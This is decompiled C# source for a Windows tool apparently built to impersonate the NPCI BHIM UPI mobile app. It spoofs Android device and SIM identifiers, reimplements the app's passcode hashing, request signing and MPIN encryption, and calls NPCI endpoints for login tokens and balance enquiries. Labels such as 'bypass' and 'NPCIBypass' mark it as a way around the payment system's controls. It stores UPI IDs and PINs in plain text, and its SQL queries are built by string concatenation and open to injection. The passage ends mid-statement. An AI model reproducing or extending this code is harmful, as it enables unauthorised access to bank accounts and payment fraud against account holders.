using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using APP_FRAMEWORK;
using Bunifu.Framework.UI;
using IRCommDLL;
using Microsoft.VisualBasic;
using Newtonsoft.Json;
using NEXUS.Properties;
using NpciPay;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.DevTools;
using OpenQA.Selenium.DevTools.V143.Emulation;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Encodings;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using QRCoder;
using SeleniumUndetectedChromeDriver;

namespace NEXUS.APP_FRAMEWORK;

public class frmNPCI : Form
{
    private static bool drag;

    private static int posX;

    private static int posY;

    private EventHandler eventHandler_0;

    private string response;

    private string string_93;

    public static string passCodeConstant;

    private string customerid;

    private string fc_v;

    private string txnId;

    private string text6;

    private string string_92;

    private WebProxy webProxy_3;

    private CookieContainer cookieContainer_3;

    private int num;

    private string fakeGcmToken;

    private string safety;

    private string string_96;

    private static readonly DateTime Jan1st1970;

    private string string_95;

    private WebException webException_0;

    private string csrfRequestIdentifier;

    private string mobnumber;

    private string modelname;

    private string oemdeviceid;

    private string androidid;

    private string simid;

    private static string[] string_0;

    private static Random random_0;

    public static string freeChargeApiHeader;

    private static Random random;

    private string encmob;

    private string cske;

    private string upiact;

    private string smspart;

    public static Assembly ass;

    public static Module _module;

    public static string listName;

    private static int LenghtAesKeyBytes;

    private static RNGCryptoServiceProvider rngCsp;

    protected static char[] hexArray;

    public static string x509CertSecondService;

    public static string packageName;

    private string upiid;

    private string upipinn;

    private string Path_;

    private bool balanceshow;

    private bool register;

    private static List<string> list;

    private static string logExitFile;

    private string xcrfff;

    internal static byte[] key;

    private string xcaccessid;

    private string xsignature;

    private string xlogintoken;

    private string mobilenumberr;

    private string registertoken;

    private string accid;

    private string accname;

    private string timestampheader;

    private bool ip;

    private string ipfor;

    private string maskedAccnumber;

    private string bankName;

    private Dictionary<string, string> dictionary_bnk;

    private UndetectedChromeDriver driver;

    private IContainer components;

    private TabControl tabControl1;

    private TabPage tb1;

    private Label label6;

    private Label lbl_balance;

    private Button btn_delete;

    private ComboBox cbo_Account;

    private Button btn_login;

    private TabPage tb2;

    private TextBox txt_pass;

    private Button btnSubmit;

    private Panel pnlQR;

    private Label label5;

    private Button btnNext;

    private PictureBox pictureBox1;

    private Button btnSubmitBank;

    private Label label4;

    private ComboBox cboBankList;

    private CheckBox chkAuto;

    private CheckBox chkManual;

    private Label label3;

    private TextBox txtOtp;

    private Button btn_bypass;

    private TextBox mobilenumber;

    private Label label2;

    private TabPage tabPage1;

    private Label label1;

    private Panel pnlHeader;

    private BunifuImageButton btnClose;

    private Label B2AAA;

    public string NUMMM { get; private set; }

    public string TextSms { get; private set; }

    public string EXREATextSms { get; private set; }

    internal event EventHandler Event_0
    {
        [MethodImpl(MethodImplOptions.Synchronized)]
        add
        {
            eventHandler_0 = (EventHandler)Delegate.Combine(eventHandler_0, value);
        }
        remove
        {
            eventHandler_0 = (EventHandler)Delegate.Remove(eventHandler_0, (EventHandler)Delegate.Combine(eventHandler_0, value));
        }
    }

    public static void Header_MouseDown(object sender, MouseEventArgs e)
    {
        Control control = ((Panel)sender).Parent;
        if (e.Button == MouseButtons.Left)
        {
            drag = true;
            posX = Cursor.Position.X - control.Left;
            posY = Cursor.Position.Y - control.Top;
        }
    }

    public static void Header_MouseMove(object sender, MouseEventArgs e)
    {
        Control control = ((Panel)sender).Parent;
        if (drag)
        {
            control.Top = Cursor.Position.Y - posY;
            control.Left = Cursor.Position.X - posX;
        }
        control.Cursor = Cursors.Default;
    }

    public static void Header_MouseUp(object sender, MouseEventArgs e)
    {
        drag = false;
    }

    public frmNPCI()
    {
        InitializeComponent();
        pnlHeader.MouseDown += Header_MouseDown;
        pnlHeader.MouseMove += Header_MouseMove;
        pnlHeader.MouseUp += Header_MouseUp;
        string text = "Aadesh,Aadi,Aafreen,Aakar,Aalap,Aandaleeb,Aashish,Abeer,Abhay,Abhayananda,Abhayaprada,Abheek,Abhi,Abhibhava,Abhicandra,Abhidi,Abhihita,Abhijat,Abhijaya,Abhijit,Abhijvala,Abhilash,Abhimand,Abhimani,Abhimanyu,Abhimanyusuta,Abhimoda,Abhinabhas,Abhinanda,Abhinandana,Abhinatha,Abhinav,Abhinava,Abhirup,Abhishek,Abhisoka,Abhisumat,Abhisyanta,Abhivira,Abhra,Abhrakasin,Abhyagni,Abhyudaya,Abhyudita,Abjayoni,Abjit,Acalapati,Acalendra,Acalesvara,Acanda,Acarya,Acaryanandana,Acaryasuta,Acaryatanaya,Acchindra,Achal,Achintya,Achyut,Achyuta,Acintya,Acyutaraya,Adalarasu,Adarsh,Adesh,Adhik,Adhikara,Adhipa,Adhita,Adikavi,Adil,Adinath,Adit,Aditeya,Aditya,Adityanandana,Adityavardhana,Adripathi,Adwaita,Adway,Adwaya,Aftab,Aftaab,Agasti,Agastya,Agendra,Agha,Agharna,Aghat,Agneya,Agnikumara,Agniprava,Agrim,Agriya,Ahijit,Ahilan,Ahmad,Ahsan,Aijaz,Aiman,Ainesh,Ajamil,Ajatashatru,Ajay,Ajinkya,Ajit,Ajitabh,Ajitesh,Ajmal,Akalmash,Akalpa,Akash,Akhil,Akhilesh,Akmal,Akram,Akroor,Akshan,Akshar,Akshat,Akshath,Akshay,Akshit,Akul,Alagan,Alagarasu,Alam,Aalam,Alamgir,Alhad,Alok,Aloke,Amal,Amalendu,Amalesh,Amanath,Amanda,Amar,Amartya,Ambar,Ambarish,Ambuj,Ameya,Amil,Amish,Amit,Amitabh,Amitabha,Amitav,Amitava,Amitbikram,Amitesh,Amitiyoti,Amitrasudan,Amiya,Amlankusum,Ammar,Amod,Amogh,Amoha,Amol,Amolik,Amolak,Amrit,Amrit,Amrik,Amulya,Anadi,Anamitra,Anand,Ananda,Anand,Ananga,Anang,Ananmaya,Anant,Ananta,Anant,Anantram,Anarghya,Anbarasu,Anbu,Anbuchelvan,Anbumadi,Angad,Angada,Angamuthu,Anil,Animish,Animesh,Anirudhha,Anirvan,Anisa,Anish,Aniteja,Anjasa,Anjum,Anjuman,Ankit,Ankur,Ankush,Anmol,Anoop,Anshu,Anshul,Anshuman,Anshumat,Anu,Anugya,Anuha,Anuj,Anunay,Anup,Anoop,Anupam,Anurag,Anurag,Anuraag,Anuttam,Anwar,Apoorva,Apparajito,Apurva,Apoorva,Arav,Aravali,Aravan,Archan,Archit,Ardhendu,Arghya,Arham,Arhant,Arihant,Arijit,Arindam,Arivalagan,Arivali,Arivarasu,Arivoli,Arivuchelvan,Arivumadhi,Arjit,Arjun,Arka,Arnav,Arnesh,Arokya,Arshad,Arul,Arulchelvan,Arumugan,Arun,Arun,Aroon,Aruni,Arvind,Arvinda,Arabinda,Arya,Aryaman,Asao,Asav,Asgar,Ashis,Ashok,Ashraf,Ashu,Ashutosh,Ashvin,Ashwatthama,Ashwin,Asvin,Ashwini,Asit,Ashit,Aslesh,Atal,Atanu,Atiya,Atma,Atmaja,Atmajyoti,Atmananda,Atralarasu,Atreya,Atul,Atul,Atulya,Atulya,Avadhesh,Avanindra,Avanish,Avatar,Avikshit,Avinash,Avkash,Ayog,Ayushman,Ayyapan,Badal,Badri,Badrinath,Badriprasad,Bahubali,Bahuleya,Bahumanya,Bahurai,Bajrang,Bakhtawar,Balaaditya,Balachandra,Balachandrav,Baladhi,Baladhitya,Balagovind,Balaji,Balakrishna,Balakumar,Balamani,Balamohan,Balamurugan,Balan,Balanath,Balaraj,Balaram,Balaravi,Balbir,Baldev,Balgopal,Balram,Balvindra, Balvinder,Balwant,Banbihari,Bandhu,Bandhul,Bankebihari,Bankim,Bankimchandra,Bansi,Bansilal,Barid,Baridbaran,Barindra,Barun,Basanta,Basavaraj,Basistha,Basudha,Bhadrak,Bhadraksh,Bhadrang,Bhadranidhi,Bhagaditya,Bhagat,Bhagirat,Bhagirath,Bhagwant,Bhagyanandana,Bhairav,Bhajan,Bhanu,Bhanudas,Bhanuprasad,Bharadwaj,Bharat,Bhargava,Bhargyaraj,Bhaskar,Bhaumik,Bhavamanyu,Bhavesh,Bhim,Bhishma,Bhojaraja,Bhooshan,Bhooshit,Bhudev,Bhumi,Bhupathi,Bhupen,Bhupendra,Bhushan,Bhuvan,Bhuvanesh,Bibek,Bibhas,Bibhavasu,Bijal,Bikram,Bilva,Bimal,Bindusar,Bipin,Birbal,Bitasok,Bodhan,Boudhayan,Brahmabrata,Brahmadutt,Bratindra,Brijesh,Brijmohan,Buddhadev,Buddhadeva,Budhil,Bukka,Chaitanya,Chakor,Chakradev,Chakradhar,Chakrapani,Chakshu,Chaman,Chamanlal,Champak,Chanakya,Chanchal,Chandak,Chandan,Chandra,Chandrabhan,Chandrachur,Chandrahas,Chandrak,Chandrakanta,Chandrakiran,Chandrakirthi,Chandrakishore,Chandrakumar,Chandramohan,Chandran,Chandranath,Chandraprakash,Chandraraj,Chandrashekar,Chandrashekhar,Chandratha,Chandresh,Chandrodaya,Chanyana,Chapal,Charan,Charanjit,Charu,Charudatta,Charudutta,Charuvardhana,Charuvindha,Chaturbhuj,Cheliyan,Chellamani,Chellamuthu,Chellapan,Chemmal,Chetan,Chetana,Chevatkodiyon,Chhandak,Chidambar,Chidambaram,Chidananda,Chiman,Chinmay,Chinmayananda,Chinnadurai,Chintamani,Chintan,Chinthanaichelvan,Chintya,Chirag,Chiranjeev,Chirantan,Chirayu,Chirtrang,Chithayu,Chitrabhanu,Chitragupta,Chitraksh,Chitral,Chitrarath,Chitrasen,Chitresh,Chitta,Chittaprasad,Chittaranjan,Chittaswarup,Chittesh,Chudamani,Dabeet,Daha,Daivya,Daiwik,Daksha,Dakshesh,Dakshi,Dakshina,Dalajit,Dalapathi,Dalbhya,Daman,Damian,Damodar,Danuj,Danvir,Darpak,Darpan,Darshan,Daruka,Dasharath,Dasharathi,Dasmaya,Dattatreya,Dayada,Dayakara,Dayanand,Dayanidhi,Dayasagara,Dayashankar,Debashis,Debashish,Deenabandhu,Deep,Deepak,Deepan,Deepankar,Deependra,Deependu,Deepesh,Deepit,Deeptanshu,Deeptendu,Deeptiman,Deeptimoy,Dev,Dev Kumar,Devabrata,Devachandra,Devadarshan,Devadas,Devadatta,Devadhipa,Devadutt,Devadyumna,Devajyoti,Devak,Devakantha,Devamadana,Devanand,Devang,Devaraj,Devarpana,Devarsi,Devarya,Devdas,Devdutta,Devendra,Devesh,Deveshwar,Devilal,Deviprasad,Devnarayan,Devnath,Devraj,Devya,Dhanajit,Dhananjay,Dhanesh,Dhanraj,Dhansukh,Dhanvant,Dharanidhar,Dharendra,Dharma,Dharmachandra,Dharmadas,Dharmadev,Dharmaditya,Dharmanand,Dharmendra,Dharmendu,Dharmesh,Dharmpal,Dharmveer,Dhaval,Dhavalachandra,Dhawal,Dheeman,Dheemant,Dheer,Dheeran,Dheerendra,Dheivamani,Dhevan,Dhevaneyan,Dhikshit,Dhinakar,Dhinanta,Dhipin,Dhiraj,Dhiren,Dhirendra,Dhritiman,Dhruv,Dhvanya,Dhwani,Dhyana,Dhyanesh,Digamber,Dilawar,Dilip,Dinanath,Dinapati,Dinar,Dindayal,Dinesh,Dinkar,Divakar,Divyanga,Divyendu,Divyesh,Drupad,Dulal,DuraiMurugan,Duranjaya,Durjaya,Dushyanta,Dwaipayan,Dwijaraj,Dwijendra,Dwijesh,Dyumani";
        listName = text;
        string AllAcs = "";
        StartSQLforDatabase(ref AllAcs);
        string text2 = AllAcs;
        string[] array = new string[1];
        string text3 = "$";
        array[0] = text3;
        string[] array2 = text2.Split(array, StringSplitOptions.RemoveEmptyEntries);
        if (array2.Length != 0)
        {
            for (int i = 0; i < array2.Length; i++)
            {
                ComboBox.ObjectCollection items = cbo_Account.Items;
                string text4 = array2[i];
                string text5 = "@upi";
                items.Add(text4 + text5);
            }
        }
        chkManual.Checked = true;
        cboBankList.AutoCompleteMode = AutoCompleteMode.Suggest;
        cboBankList.AutoCompleteSource = AutoCompleteSource.ListItems;
    }

    private void btn_login_Click(object sender, EventArgs e)
    {
        string text = cbo_Account.SelectedItem.ToString();
        string oldValue = "@upi";
        string mobileNum = text.Replace(oldValue, "");
        string field = "RegiInfo";
        string text2 = Table_ReadSQL(field, mobileNum);
        if (!string.IsNullOrEmpty(text2))
        {
            string text3 = checkbakance(text2);
            string value = "balance";
            if (text3.Contains(value))
            {
                string what = "balance";
                string text4 = jsonData_Serial(text3, what);
                string what2 = "maskedAccountNumber";
                maskedAccnumber = jsonData_Serial(text3, what2);
                string text5 = "A/c Balance for ";
                string text6 = maskedAccnumber;
                string text7 = "is ";
                string text8 = text5 + text6 + text7 + text4;
                string text9 = bankName;
                string text10 = "\r\n";
                MessageBox.Show(text9 + text10 + text8);
            }
            else
            {
                string what3 = "userMessage";
                string text11 = jsonData_Serial(text3, what3);
                Form owner = new Form
                {
                    TopMost = true
                };
                string caption = "Error";
                MessageBox.Show(owner, text11, caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
                label2.Visible = true;
                label2.Text = text11;
            }
        }
    }

    private string checkbakance(string readdata)
    {
        new Balance();
        string[] array = new string[1];
        string text = "||##||";
        array[0] = text;
        string[] array2 = readdata.Split(array, StringSplitOptions.None);
        string text2 = "";
        mobilenumberr = array2[9];
        xcaccessid = array2[0];
        upiid = array2[1];
        xsignature = array2[2];
        string text3 = array2[3];
        string text4 = array2[4];
        bankName = array2[5];
        string text5 = array2[6];
        text5 = GetRandAesKey().ToLower();
        string inputString = text3;
        string text6 = "91";
        string inputString2 = text6 + mobilenumberr;
        string text7 = sha256(inputString);
        text7 = sha256(text7 + passCodeConstant);
        text7 = sha256(text7 + passCodeConstant);
        string text8 = sha256(inputString2);
        text3 = sha256(text7 + text8 + passCodeConstant);
        text3 = sha256(sha256(text3 + passCodeConstant));
        text3 = sha256(text3 + passCodeConstant);
        text3 = sha256(text3 + passCodeConstant);
        text3 = sha256(text3 + text8 + passCodeConstant);
        text3 = sha256(text3 + passCodeConstant);
        string text9 = "{\"os\":\"ANDROID\",\"passcode\":\"";
        string text10 = text3;
        string text11 = "\",\"appVersion\":\"4.0.16\"}";
        text2 = text9 + text10 + text11;
        string text12 = "https://upi.npci.org.in/api/v3/loginTokens";
        string_93 = text12;
        string s = array2[7];
        androidid = array2[8];
        accid = array2[10];
        string text13 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
        Encoding uTF = Encoding.UTF8;
        string text14 = text13;
        string text15 = "|/api/v3/loginTokens|W29iamVjdCBPYmplY3Rd";
        string s2 = Convert.ToBase64String(uTF.GetBytes(text14 + text15));
        byte[] inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
        string text16 = "v3|";
        xsignature = text16 + Convert.ToBase64String(inArray);
        xcaccessid = array2[0];
        text5 = array2[1];
        xsignature = array2[2];
        text7 = array2[3];
        text13 = array2[9];
        string inputString3 = text7;
        string text17 = "91";
        inputString2 = text17 + text13;
        string text18 = sha256(sha256(sha256(inputString3) + passCodeConstant) + passCodeConstant);
        string text19 = sha256(inputString2);
        text7 = sha256(text18 + text19 + passCodeConstant);
        text7 = sha256(sha256(text7 + passCodeConstant));
        text7 = sha256(text7 + passCodeConstant);
        text7 = sha256(text7 + passCodeConstant);
        text7 = sha256(text7 + text19 + passCodeConstant);
        text7 = sha256(text7 + passCodeConstant);
        string text20 = "{\"os\":\"ANDROID\",\"passcode\":\"";
        string text21 = text7;
        string text22 = "\",\"appVersion\":\"4.0.9.1\"}";
        string text23 = text20 + text21 + text22;
        string text24 = "https://upi.npci.org.in/api/v3/loginTokens";
        string_93 = text24;
        s = array2[7];
        string text25 = array2[8];
        string text26 = array2[10];
        timestampheader = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
        Encoding uTF2 = Encoding.UTF8;
        string text27 = timestampheader;
        string text28 = "|/api/v3/loginTokens|W29iamVjdCBPYmplY3Rd";
        s2 = Convert.ToBase64String(uTF2.GetBytes(text27 + text28));
        inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
        string text29 = "v1|";
        xsignature = text29 + Convert.ToBase64String(inArray);
        method_5(string_93, text2, string_92, ref webProxy_3, ref cookieContainer_3, bool_2: false, bool_3: true, 120000, 120000, ref string_96, ref string_95, ref webException_0);
        ConnectHttp(string_93, text2, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
        string text30 = string_96;
        string value = "error\":true";
        if (!text30.Contains(value))
        {
            string text31 = string_96;
            string value2 = "Request Rejected";
            if (!text31.Contains(value2))
            {
                string str = string_96;
                string what = "token";
                xlogintoken = jsonData_Serial(str, what);
                text13 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                Encoding uTF3 = Encoding.UTF8;
                string text32 = text13;
                string text33 = "|/api/v3/npci/keys?clVersion=2.0-01-20180331|W29iamVjdCBPYmplY3Rd";
                s2 = Convert.ToBase64String(uTF3.GetBytes(text32 + text33));
                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                string text34 = "v1|";
                xsignature = text34 + Convert.ToBase64String(inArray);
                string text35 = "https://upi.npci.org.in/api/v3/npci/keys?clVersion=2.0-01-20180331";
                string_93 = text35;
                method_5(string_93, null, string_92, ref webProxy_3, ref cookieContainer_3, bool_2: false, bool_3: true, 120000, 120000, ref string_96, ref string_95, ref webException_0);
                text26 = "";
                try
                {
                    text23 = text4;
                    string text36 = "UPI";
                    string text37 = Guid.NewGuid().ToString();
                    string oldValue = "-";
                    string text38 = text37.Replace(oldValue, string.Empty).ToUpper().Substring(0, 31);
                    string text39 = "7";
                    txnId = text36 + text38 + text39;
                    string[] array3 = new string[7];
                    string text40 = "0.00|";
                    array3[0] = text40;
                    array3[1] = txnId;
                    string text41 = "|||in.org.npci.upiapp|";
                    array3[2] = text41;
                    array3[3] = mobilenumberr;
                    string text42 = "|";
                    array3[4] = text42;
                    array3[5] = androidid;
                    string text43 = "|reqBalEnq";
                    array3[6] = text43;
                    string input = string.Concat(array3);
                    byte[] array4 = new byte[16];
                    rngCsp.GetBytes(array4);
                    string text44 = AESGCMEncryptToBase64(SHA256withKey(input, array4), StringToByteArray(text5), array4);
                    string text45 = "|";
                    text25 = text44 + text45 + Convert.ToBase64String(array4);
                    string[] array5 = new string[5] { text23, null, null, null, null };
                    string text46 = "|";
                    array5[1] = text46;
                    array5[2] = txnId;
                    string text47 = "|";
                    array5[3] = text47;
                    array5[4] = text25;
                    string input2 = string.Concat(array5);
                    string text48 = "MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuDbDFnrdaI0hCnl2CoAn70a9krjKAaQCgtJfiEv6yDGBTC8lPfxisb/U5NIAf7JRcM2oo2YGf09aavVmvXzv5xgm9SwucHzveCi4/j/JxGZP6VUorbqX3aJHbClUyS5RsNKlkBYKKpcZH6RTHmn91FDjsjdHjUsrQK7R0hT0XLL8v0wUdhCjy2adhUlewrRFCvISJ1/jIr7BkqwH9nv+6SXL0IzSJDSibSshBFcLIv3mYF0joY370/j9pGFQOsdEduELO+AbYh1hIGu5KKQwzY0/CgKaonOzRVK+pAHxLrZt9mprRKDWRk4q3SaDG2J7ZfvAgbic67X/4IzU7py0vQIBAw==";
                    string s3 = text48;
                    AsymmetricKeyParameter publicKey = PublicKeyFactory.CreateKey(Convert.FromBase64String(s3));
                    string text49 = RsaEncrypt(input2, publicKey);
                    string text50 = "UPI";
                    string text51 = Guid.NewGuid().ToString();
                    string oldValue2 = "-";
                    string text52 = text51.Replace(oldValue2, string.Empty).ToUpper().Substring(0, 31);
                    string text53 = "7";
                    txnId = text50 + text52 + text53;
                    string text54 = upiid;
                    string[] array6 = new string[11];
                    string text55 = "0.00|";
                    array6[0] = text55;
                    array6[1] = txnId;
                    string text56 = "|";
                    array6[2] = text56;
                    array6[3] = text54;
                    string text57 = "|";
                    array6[4] = text57;
                    array6[5] = text54;
                    string text58 = "|in.org.npci.upiapp|91";
                    array6[6] = text58;
                    array6[7] = mobilenumberr;
                    string text59 = "|";
                    array6[8] = text59;
                    array6[9] = androidid;
                    string text60 = "|reqBalEnq";
                    array6[10] = text60;
                    string input3 = string.Concat(array6);
                    rngCsp.GetBytes(array4);
                    string text61 = AESGCMEncryptToBase64(SHA256withKey(input3, array4), StringToByteArray(text5), array4);
                    string text62 = "|";
                    text25 = text61 + text62 + Convert.ToBase64String(array4);
                    string[] array7 = new string[5] { text23, null, null, null, null };
                    string text63 = "|";
                    array7[1] = text63;
                    array7[2] = txnId;
                    string text64 = "|";
                    array7[3] = text64;
                    array7[4] = text25;
                    string input4 = string.Concat(array7);
                    publicKey = PublicKeyFactory.CreateKey(Convert.FromBase64String(s3));
                    text49 = RsaEncrypt(input4, publicKey);
                    string text65 = "2.3-v1.8|";
                    text26 = text65 + text49;
                }
                catch
                {
                }
                text13 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                Encoding uTF4 = Encoding.UTF8;
                string text66 = text13;
                string text67 = "|/api/v3/accounts/";
                string text68 = accid;
                string text69 = "|W29iamVjdCBPYmplY3Rd";
                s2 = Convert.ToBase64String(uTF4.GetBytes(text66 + text67 + text68 + text69));
                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                string text70 = "v1|";
                xsignature = text70 + Convert.ToBase64String(inArray);
                string text71 = "https://upi.npci.org.in/api/v3/accounts/";
                string_93 = text71 + accid;
                string text72 = "{\"upiRequestId\":\"UPI1F38DDF8359F47BB9AEE8017CEEFCD77\",\"npciData\":{\"mpincred\":{\"MPIN\":{\"reqBalEnq\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.3-v1.8|n4XCrOg==\",\"hmac\":null,\"ki\":\"20150822\",\"oda\":null,\"pid\":null,\"skey\":null,\"type\":null},\"subType\":\"MPIN\",\"type\":\"PIN\"}}},\"cred\":{\"MPIN\":{\"reqBalEnq\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.3-v1.8|n4XCrOg==\",\"hmac\":null,\"ki\":\"20150822\",\"oda\":null,\"pid\":null,\"skey\":null,\"type\":null},\"subType\":\"MPIN\",\"type\":\"PIN\"}}}},\"updateType\":\"balance\"}";
                text2 = text72;
                string text73 = text2;
                string oldValue3 = "UPI1F38DDF8359F47BB9AEE8017CEEFCD77";
                text2 = text73.Replace(oldValue3, txnId);
                string text74 = text2;
                string oldValue4 = "2.3-v1.8|n4XCrOg==";
                text2 = text74.Replace(oldValue4, text26);
                method_5(string_93, text2, string_92, ref webProxy_3, ref cookieContainer_3, bool_2: false, bool_3: true, 120000, 120000, ref string_96, ref string_95, ref webException_0);
                return string_96;
            }
        }
        return string_96;
    }

    public void Table_Write_Save_RegisInfo(string val, string mobileNum, string pin, string vpa)
    {
        string[] array = new string[5];
        string text = "INSERT INTO TBL_NPCI(MobNo, RegiInfo, TimeStamp) VALUES ('";
        array[0] = text;
        array[1] = mobileNum;
        string text2 = "', '";
        string text3 = "', '";
        array[2] = text2 + val + text3;
        DateTime now = DateTime.Now;
        string text4 = "dd/M/yyyy hh:mm:ss.fff tt";
        array[3] = now.ToString(text4);
        string text5 = "')";
        array[4] = text5;
        string query = string.Concat(array);
        ExecuteQuery(query);
        string[] array2 = new string[5] { vpa, null, null, null, null };
        string text6 = "||";
        array2[1] = text6;
        array2[2] = pin;
        string text7 = "||";
        array2[3] = text7;
        array2[4] = mobileNum.Trim();
        string data = string.Concat(array2);
        string text8 = "NPCI_";
        InsertUpiDatabase(text8 + vpa, data);
    }

    private string Table_ReadSQL(string Field, string mobileNum)
    {
        string result = "";
        try
        {
            DataTable dataTable = new DataTable();
            string text = "SELECT * FROM [TBL_NPCI] WHERE [MobNo] = '";
            string text2 = "'";
            new SQLiteDataAdapter(text + mobileNum + text2, Class34.string_Database).Fill(dataTable);
            if (dataTable != null && dataTable.Rows.Count > 0)
            {
                foreach (DataRow row in dataTable.Rows)
                {
                    result = row[Field].ToString();
                }
            }
        }
        catch (Exception)
        {
        }
        return result;
    }

    private void InsertUpiDatabase(string upi, string data)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '";
            string text2 = "' AND BANK_ISDEBIT = 0";
            sQLiteCommand.CommandText = text + upi + text2;
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result > 0)
            {
                string text3 = "DELETE from TBL_BANK where BANK_SAVEAS = '";
                string text4 = "' AND BANK_ISDEBIT = 0";
                sQLiteCommand.CommandText = text3 + upi + text4;
                sQLiteCommand.ExecuteNonQuery();
            }
            string[] array = new string[7];
            string text5 = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('";
            array[0] = text5;
            string text6 = "NPCIBypass";
            array[1] = text6;
            string text7 = "', '";
            array[2] = text7;
            array[3] = upi;
            string text8 = "', '";
            array[4] = text8;
            array[5] = data;
            string text9 = "', 0)";
            array[6] = text9;
            sQLiteCommand.CommandText = string.Concat(array);
            sQLiteCommand.ExecuteNonQuery();
            sQLiteConnection.Close();
            sQLiteCommand.Dispose();
        }
        catch
        {
        }
    }

    private void Delete_Accont(string mobNum, string vpa)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            SQLiteCommand sQLiteCommand2 = sQLiteCommand;
            string text = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = 'NPCI_";
            string text2 = "' AND BANK_ISDEBIT = 0";
            sQLiteCommand2.CommandText = text + vpa + text2;
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result > 0)
            {
                SQLiteCommand sQLiteCommand3 = sQLiteCommand;
                string text3 = "DELETE from TBL_BANK where BANK_SAVEAS = 'NPCI_";
                string text4 = "' AND BANK_ISDEBIT = 0";
                sQLiteCommand3.CommandText = text3 + vpa + text4;
                sQLiteCommand.ExecuteNonQuery();
            }
            SQLiteConnection sQLiteConnection2 = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection2.Open();
            sQLiteCommand = new SQLiteCommand(sQLiteConnection2);
            SQLiteCommand sQLiteCommand4 = sQLiteCommand;
            string text5 = "SELECT count(RID) from TBL_NPCI where MobNo = '";
            string text6 = "'";
            sQLiteCommand4.CommandText = text5 + mobNum + text6;
            obj = sQLiteCommand.ExecuteScalar();
            result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result > 0)
            {
                SQLiteCommand sQLiteCommand5 = sQLiteCommand;
                string text7 = "DELETE from TBL_NPCI where MobNo = '";
                string text8 = "'";
                sQLiteCommand5.CommandText = text7 + mobNum + text8;
                sQLiteCommand.ExecuteNonQuery();
            }
        }
        catch
        {
        }
    }

    private void heck_AccontExist(string mobNum)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            string text = "SELECT count(RID) from TBL_NPCI where MobNo = '";
            string text2 = "'";
            sQLiteCommand.CommandText = text + mobNum + text2;
            object obj = sQLiteCommand.ExecuteScalar();
            int result = 0;
            if (obj != null && obj.GetType() != typeof(DBNull))
            {
                int.TryParse(obj.ToString().Trim(), out result);
            }
            if (result > 0)
            {
                string text3 = "DELETE from TBL_NPCI where MobNo = '";
                string text4 = "'";
                sQLiteCommand.CommandText = text3 + mobNum + text4;
                sQLiteCommand.ExecuteNonQuery();
            }
        }
        catch
        {
        }
    }

    public bool StartSQLforDatabase(ref string AllAcs)
    {
        bool result = true;
        try
        {
            AllAcs = "";
            DataTable dataTable = new DataTable();
            string commandText = "SELECT * FROM [TBL_NPCI]";
            new SQLiteDataAdapter(commandText, Class34.string_Database).Fill(dataTable);
            if (dataTable != null && dataTable.Rows.Count > 0)
            {
                IEnumerator enumerator = dataTable.Rows.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    DataRow dataRow = (DataRow)enumerator.Current;
                    string columnName = "RID";
                    string text = dataRow[columnName].ToString();
                    string columnName2 = "MobNo";
                    string text2 = dataRow[columnName2].ToString();
                    if (!AllAcs.Contains(text2))
                    {
                        AllAcs += text2;
                        string text3 = AllAcs;
                        string text4 = "$";
                        AllAcs = text3 + text4;
                    }
                    else
                    {
                        string text5 = "DELETE from TBL_UPI where RID = '";
